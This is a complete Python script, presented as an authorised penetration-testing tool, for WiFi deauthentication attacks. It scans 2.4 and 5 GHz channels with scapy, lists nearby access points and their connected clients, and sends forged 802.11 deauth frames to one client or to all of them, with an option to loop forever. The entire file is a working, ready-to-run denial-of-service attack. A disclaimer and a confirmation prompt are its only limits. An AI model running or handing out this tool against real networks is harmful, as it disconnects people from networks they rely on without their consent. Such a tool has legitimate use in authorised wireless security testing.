#!/usr/bin/env python3
"""
WiFi Deauth Tool — Educational / Authorised Penetration Testing Only
Author: itsrajadarsh
DISCLAIMER: Only use this on networks you own or have explicit written
            permission to test. Unauthorised use is illegal.
"""

import os
import sys
import time
import signal
import subprocess
import threading
from scapy.all import (
    sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt,
    Dot11EltDSSSet, Dot11Deauth
)

# ── Globals ────────────────────────────────────────────────────────────────────
found_aps: dict = {}          # bssid → {ssid, channel, rssi}
found_clients: dict = {}      # mac   → rssi (int | None)
_stop_hopper = threading.Event()

# 2.4 GHz + most common 5 GHz channels (UNII-1/2/3)
CHANNELS_2G = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10]
CHANNELS_5G = [36, 40, 44, 48, 52, 56, 60, 64,
               100, 104, 108, 112, 116, 120, 124, 128,
               132, 136, 140, 149, 153, 157, 161, 165]
ALL_CHANNELS = CHANNELS_2G + CHANNELS_5G


# ── Helpers ────────────────────────────────────────────────────────────────────

def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess command, suppressing output by default."""
    kwargs.setdefault("stdout", subprocess.DEVNULL)
    kwargs.setdefault("stderr", subprocess.DEVNULL)
    return subprocess.run(cmd, **kwargs)


# ── Signal Strength Helpers ────────────────────────────────────────────────────

def rssi_from_pkt(pkt) -> int | None:
    """
    Extract RSSI (dBm) from the RadioTap header.
    Returns an int (e.g. -65) or None if unavailable.
    """
    try:
        from scapy.all import RadioTap as RT
        if pkt.haslayer(RT):
            rt = pkt[RT]
            # Scapy exposes the signal as dBm_AntSignal
            dbm = getattr(rt, "dBm_AntSignal", None)
            if dbm is not None:
                return int(dbm)
    except Exception:
        pass
    return None


def rssi_label(dbm: int | None) -> str:
    """Return a human-readable quality label for an RSSI value."""
    if dbm is None:
        return "No signal"
    if dbm >= -50:
        return "Excellent"
    if dbm >= -60:
        return "Good"
    if dbm >= -70:
        return "Fair"
    if dbm >= -80:
        return "Weak"
    return "Very Weak"


def rssi_bar(dbm: int | None, width: int = 10) -> str:
    """
    Build a coloured ASCII bar representing signal strength.

    Signal range mapped:  -100 dBm (0 bars) … -30 dBm (full bars)
    Colours (ANSI):  red → yellow → green
    """
    if dbm is None:
        return "[" + " " * width + "]  n/a  "

    # Clamp to [-100, -30] then normalise to [0, 1]
    clamped = max(-100, min(-30, dbm))
    ratio   = (clamped + 100) / 70          # 70 = range width in dBm
    filled  = round(ratio * width)

    if ratio >= 0.70:        # good  → green
        colour = "\033[92m"
    elif ratio >= 0.40:      # fair  → yellow
        colour = "\033[93m"
    else:                    # weak  → red
        colour = "\033[91m"
    reset = "\033[0m"

    bar = colour + "█" * filled + reset + "░" * (width - filled)
    return f"[{bar}] {dbm:4d} dBm  {rssi_label(dbm)}"


def nm_unmanage(iface: str) -> None:
    """
    Tell NetworkManager to stop managing ONLY the selected interface.
    All other interfaces (wlo1, enp2s0, …) stay connected and unaffected.
    """
    print(f"[*] Unmanaging {iface} from NetworkManager (other interfaces stay up)...")
    # Disconnect this interface in NM without touching anything else
    run(["sudo", "nmcli", "device", "disconnect", iface])
    # Mark as unmanaged so NM won't try to reclaim it during our session
    run(["sudo", "nmcli", "device", "set", iface, "managed", "no"])
    time.sleep(1)


def nm_remanage(iface: str) -> None:
    """Return the interface to NetworkManager control."""
    print(f"[*] Returning {iface} to NetworkManager...")
    run(["sudo", "nmcli", "device", "set", iface, "managed", "yes"])
    time.sleep(1)


def set_monitor_mode(iface: str) -> bool:
    """Put interface into monitor mode. Returns True on success."""
    print(f"[*] Switching {iface} to monitor mode...")
    run(["sudo", "ip", "link", "set", iface, "down"])
    result = run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    run(["sudo", "ip", "link", "set", iface, "up"])
    time.sleep(2)
    if result.returncode != 0:
        print(f"[!] iw returned non-zero ({result.returncode}). Trying iwconfig fallback...")
        run(["sudo", "iwconfig", iface, "mode", "monitor"])
        run(["sudo", "ip", "link", "set", iface, "up"])
        time.sleep(2)
    return True


def set_managed_mode(iface: str) -> None:
    """Return interface to managed mode."""
    print(f"[*] Switching {iface} to managed mode...")
    run(["sudo", "ip", "link", "set", iface, "down"])
    run(["sudo", "iw", "dev", iface, "set", "type", "managed"])
    run(["sudo", "ip", "link", "set", iface, "up"])
    time.sleep(1)


def set_channel(iface: str, channel: int, retries: int = 5) -> bool:
    """
    Attempt to lock the interface to a specific channel.
    Retries with back-off to handle 'Device or resource busy' (-16).
    Returns True if successful.
    """
    for attempt in range(1, retries + 1):
        result = subprocess.run(
            ["sudo", "iw", "dev", iface, "set", "channel", str(channel)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if result.returncode == 0:
            return True
        stderr = result.stderr.decode(errors="ignore").strip()
        print(f"  [!] Channel set attempt {attempt}/{retries} failed: {stderr}")
        # Brief down/up cycle can release the lock
        run(["sudo", "ip", "link", "set", iface, "down"])
        time.sleep(0.5 * attempt)
        run(["sudo", "ip", "link", "set", iface, "up"])
        time.sleep(0.5 * attempt)
    print(f"  [-] Could not lock to channel {channel}. Packets may still be sent.")
    return False


# ── Channel Hopper ─────────────────────────────────────────────────────────────

def channel_hopper(iface: str) -> None:
    """Cycle through all channels while scanning."""
    _stop_hopper.clear()
    while not _stop_hopper.is_set():
        for ch in ALL_CHANNELS:
            if _stop_hopper.is_set():
                return
            run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)])
            time.sleep(0.3)


# ── Packet Callbacks ───────────────────────────────────────────────────────────

def _ap_callback(pkt) -> None:
    """Collect beacon frames → populate found_aps (with live RSSI updates)."""
    try:
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        if not bssid:
            return

        rssi = rssi_from_pkt(pkt)

        # If already known, just refresh the RSSI (stronger sample wins)
        if bssid in found_aps:
            if rssi is not None:
                old = found_aps[bssid].get("rssi")
                if old is None or rssi > old:   # higher dBm = stronger signal
                    found_aps[bssid]["rssi"] = rssi
            return

        raw_ssid = pkt[Dot11Elt].info
        ssid = raw_ssid.decode(errors="ignore").strip() or "Hidden"

        # Try DSS set tag first, then walk Dot11Elt tags for DS Param (ID=3)
        channel = None
        if pkt.haslayer(Dot11EltDSSSet):
            channel = pkt[Dot11EltDSSSet].channel
        else:
            elt = pkt[Dot11Elt]
            while isinstance(elt, Dot11Elt):
                if elt.ID == 3 and elt.info:
                    channel = elt.info[0]
                    break
                elt = elt.payload

        found_aps[bssid] = {"ssid": ssid, "channel": channel, "rssi": rssi}
        ch_str = f"Ch: {channel}" if channel else "Ch: ?"
        sig_str = f"{rssi} dBm" if rssi is not None else "n/a"
        print(f"  [AP Found] {bssid} - {ssid} ({ch_str}, {sig_str})")
    except Exception:
        pass


def _client_callback(pkt, target_bssid: str) -> None:
    """Collect MACs communicating with the target AP (with RSSI)."""
    try:
        if not pkt.haslayer(Dot11):
            return
        addrs = {pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3}
        if target_bssid not in addrs:
            return

        rssi = rssi_from_pkt(pkt)

        for addr in [pkt[Dot11].addr1, pkt[Dot11].addr2]:
            if not addr or addr in (target_bssid, "ff:ff:ff:ff:ff:ff"):
                continue
            if addr not in found_clients:
                found_clients[addr] = rssi
                sig_str = f"{rssi} dBm" if rssi is not None else "n/a"
                print(f"  [Client Found] {addr}  ({sig_str})")
            elif rssi is not None:
                old = found_clients[addr]
                if old is None or rssi > old:
                    found_clients[addr] = rssi   # keep strongest sample
    except Exception:
        pass


# ── Input Helpers ──────────────────────────────────────────────────────────────

def safe_input(prompt: str) -> str:
    """
    Thin wrapper around input() that converts KeyboardInterrupt
    into a clean exit message instead of a traceback.
    """
    try:
        return input(prompt)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        raise


def prompt_int(prompt: str, default: int | None = None,
               min_val: int | None = None, max_val: int | None = None) -> int:
    """Prompt for an integer with optional default and range validation.
    Ctrl+C at any point propagates as KeyboardInterrupt.
    """
    hint = f" [{default}]" if default is not None else ""
    while True:
        try:
            raw = input(f"{prompt}{hint}: ").strip()
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            raise
        if raw == "" and default is not None:
            return default
        try:
            val = int(raw)
            if min_val is not None and val < min_val:
                print(f"  [!] Must be >= {min_val}")
                continue
            if max_val is not None and val > max_val:
                print(f"  [!] Must be <= {max_val}")
                continue
            return val
        except ValueError:
            print("  [!] Please enter a valid integer. (Ctrl+C to quit)")


def prompt_float(prompt: str, default: float) -> float:
    """Prompt for a float with a default fallback.
    Ctrl+C at any point propagates as KeyboardInterrupt.
    """
    while True:
        try:
            raw = input(f"{prompt} [{default}]: ").strip()
        except KeyboardInterrupt:
            print("\n[!] Interrupted.")
            raise
        if raw == "":
            return default
        try:
            return float(raw)
        except ValueError:
            print("  [!] Please enter a valid number. (Ctrl+C to quit)")


# ── Main ───────────────────────────────────────────────────────────────────────

def main() -> None:
    global found_clients

    # ── Root check ────────────────────────────────────────────────────────────
    if os.getuid() != 0:
        print("[-] This script must be run as root (sudo).")
        sys.exit(1)

    print("=" * 55)
    print("  WiFi Deauth Tool — Authorised Pen-Testing Only")
    print("=" * 55)
    print("[!] DISCLAIMER: Only use on networks you own or have")
    print("    explicit written permission to test.\n")

    selected_iface_ref: str | None = None   # must be defined before try/finally

    try:
        # ── Interface selection ───────────────────────────────────────────────
        import netifaces
        interfaces = [i for i in netifaces.interfaces() if i != "lo"]
        print("--- Available Interfaces ---")
        for i, iface in enumerate(interfaces):
            print(f"  {i}) {iface}")

        iface_idx = prompt_int("\n[?] Select interface index", min_val=0, max_val=len(interfaces) - 1)
        selected_iface = interfaces[iface_idx]
        selected_iface_ref = selected_iface   # now safe to restore in finally

        # ── Release ONLY this interface from NetworkManager, then monitor mode ─
        nm_unmanage(selected_iface)
        set_monitor_mode(selected_iface)

        # ── Phase 1: AP Scan ──────────────────────────────────────────────────
        scan_time = 20
        print(f"\n[*] Phase 1: Scanning for APs ({scan_time}s)...")
        print("    (Hopping all 2.4 GHz + 5 GHz channels)")

        hopper_thread = threading.Thread(
            target=channel_hopper, args=(selected_iface,), daemon=True
        )
        hopper_thread.start()

        try:
            sniff(iface=selected_iface, prn=_ap_callback,
                  timeout=scan_time, store=False)
        except OSError as e:
            # "Network is down" can fire when the hopper changes channels;
            # we just ignore it and continue with whatever we collected.
            print(f"  [~] Sniff ended early ({e}). Continuing with collected APs.")

        _stop_hopper.set()
        hopper_thread.join(timeout=3)

        if not found_aps:
            print("[-] No APs found. Try a longer scan or check your hardware.")
            return

        # ── Build sorted AP list once (used across all attack rounds) ─────────
        ap_list = sorted(
            found_aps.keys(),
            key=lambda b: found_aps[b].get("rssi") or -999,
            reverse=True
        )

        # ── Phase 2: initial client scan (runs once per AP selection) ─────────
        current_ap_bssid: str | None  = None
        client_list: list[str]        = []

        # ── Attack loop ───────────────────────────────────────────────────────
        while True:

            # ── Show AP list ──────────────────────────────────────────────────
            print("\n--- Access Points ---")
            print(f"  {'#':<4} {'BSSID':<19} {'SSID':<24} {'Ch':<5} Signal")
            print("  " + "-" * 75)
            for i, bssid in enumerate(ap_list):
                info = found_aps[bssid]
                ch_str       = str(info["channel"]) if info["channel"] else "?"
                bar_str      = rssi_bar(info.get("rssi"))
                ssid_display = info['ssid'][:22]
                print(f"  {i:<4} {bssid:<19} {ssid_display:<24} {ch_str:<5} {bar_str}")

            ap_idx       = prompt_int("\n[?] Select AP index", min_val=0, max_val=len(ap_list) - 1)
            target_bssid = ap_list[ap_idx]
            target_info  = found_aps[target_bssid]
            target_ch    = target_info["channel"]

            print(f"\n[*] Target: {target_info['ssid']} ({target_bssid})")

            # ── Lock channel ──────────────────────────────────────────────────
            if target_ch:
                print(f"[*] Locking {selected_iface} to channel {target_ch}...")
                if set_channel(selected_iface, target_ch):
                    print(f"    ✓ Locked to channel {target_ch}")
            else:
                print("[!] Channel unknown — skipping channel lock.")

            # ── Client scan (only when AP changes) ────────────────────────────
            if target_bssid != current_ap_bssid:
                current_ap_bssid = target_bssid
                client_scan_time = 15
                found_clients    = {}
                print(f"\n[*] Scanning for clients on '{target_info['ssid']}' ({client_scan_time}s)...")
                try:
                    sniff(iface=selected_iface,
                          prn=lambda p: _client_callback(p, target_bssid),
                          timeout=client_scan_time, store=False)
                except OSError as e:
                    print(f"  [~] Client sniff ended early ({e}).")

                client_list = sorted(
                    found_clients.keys(),
                    key=lambda m: found_clients[m] or -999,
                    reverse=True
                )

            # ── Show client list ──────────────────────────────────────────────
            print("\n--- Verified Clients ---")
            print(f"  {'#':<4} {'MAC Address':<19} Signal")
            print("  " + "-" * 55)
            print(f"  {'0':<4} {'BROADCAST':<19} (all clients — use with caution)")
            for i, mac in enumerate(client_list, start=1):
                bar_str = rssi_bar(found_clients.get(mac))
                print(f"  {i:<4} {mac:<19} {bar_str}")

            c_idx = prompt_int(
                "\n[?] Select client index (0 = broadcast)",
                default=0, min_val=0, max_val=len(client_list)
            )
            target_client = "ff:ff:ff:ff:ff:ff" if c_idx == 0 else client_list[c_idx - 1]

            # ── Deauth parameters ─────────────────────────────────────────────
            p_count  = prompt_int("[?] Packet count (0 = infinite loop)", default=100, min_val=0)
            p_inter  = prompt_float("[?] Interval between packets (sec)", default=0.1)
            p_reason = prompt_int(
                "[?] Deauth reason code (1=unspec, 7=mismatch) [7]",
                default=7, min_val=1, max_val=23
            )

            # ── Confirm ───────────────────────────────────────────────────────
            print("\n[!] About to send deauth frames:")
            print(f"    AP      : {target_bssid} ({target_info['ssid']})")
            print(f"    Client  : {target_client}")
            print(f"    Count   : {'∞' if p_count == 0 else p_count}")
            print(f"    Interval: {p_inter}s")
            print(f"    Reason  : {p_reason}")
            confirm = safe_input("\n[?] Proceed? (yes/no) [no]: ").strip().lower()
            if confirm not in ("yes", "y"):
                print("[-] Attack skipped.")
            else:
                # ── Send deauth frames ────────────────────────────────────────
                print("\n[*] Launching Deauth attack... (Ctrl+C to stop)")
                pkt = (RadioTap() /
                       Dot11(addr1=target_client, addr2=target_bssid, addr3=target_bssid) /
                       Dot11Deauth(reason=p_reason))
                try:
                    send_kwargs = {
                        "iface": selected_iface,
                        "inter": p_inter,
                        "verbose": True
                    }
                    if p_count > 0:
                        send_kwargs["count"] = p_count
                    else:
                        send_kwargs["loop"] = 1

                    sendp(pkt, **send_kwargs)
                except KeyboardInterrupt:
                    print("\n\n[!] Attack interrupted by user.")

            # ── Post-attack prompt ────────────────────────────────────────────
            print("\n" + "─" * 55)
            again = safe_input("[?] Run another attack from the scanned list? (yes/no) [no]: ").strip().lower()
            if again not in ("yes", "y"):
                print("[-] Exiting attack loop.")
                break
            print("  [~] Re-using scanned data — no new scan needed.\n")

    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user.")
    except Exception as exc:
        print(f"\n[!] Unexpected error: {exc}")
        raise
    finally:
        _stop_hopper.set()
        if selected_iface_ref:
            set_managed_mode(selected_iface_ref)
            nm_remanage(selected_iface_ref)
            print("[*] Done. Interface restored.")
        else:
            print("[*] Exited before interface was selected — nothing to restore.")


if __name__ == "__main__":
    main()